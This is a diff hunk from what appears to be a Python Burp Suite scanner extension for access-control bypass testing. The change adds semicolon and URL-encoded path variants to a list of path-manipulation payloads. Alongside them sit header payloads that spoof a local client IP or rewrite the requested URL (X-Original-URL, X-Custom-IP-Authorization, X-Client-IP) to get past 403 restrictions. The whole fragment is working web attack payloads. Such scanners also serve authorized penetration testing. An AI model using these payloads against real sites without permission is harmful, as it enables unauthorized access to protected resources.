@@ -75,7 +75,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         self.stdout.println("Scanning: "+HURl)
 
 
-        payloads = ["#"+LastPath,"/"+HURl,"%2e"+LastPath,"%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", "%20/"+LastPath,LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/" , LastPath+"?",LastPath+"??"
+        payloads = ["/%3b"+LastPath,"/;/","/%3b/"+LastPath,"/;/"+LastPath,"#"+LastPath,"/"+HURl,"%2e"+LastPath,"%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", "%20/"+LastPath,LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/" , LastPath+"?",LastPath+"??"
         ,"/"+LastPath+"//",LastPath+"/",LastPath+"/.randomstring",LastPath+".json"]
         # hpayloads = ["X-Rewrite-URL: "+OriginalUrl, "X-Original-URL: "+OriginalUrl,"Referer: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwared-Host: 127.0.0.1"]
         hpayloads = ["X-Original-URL: "+LastPath,"Content-Length: 0","X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath, "Referer: "+ Rurl,"X-Host: 127.0.0.1","X-Client-IP: 127.0.0.1"
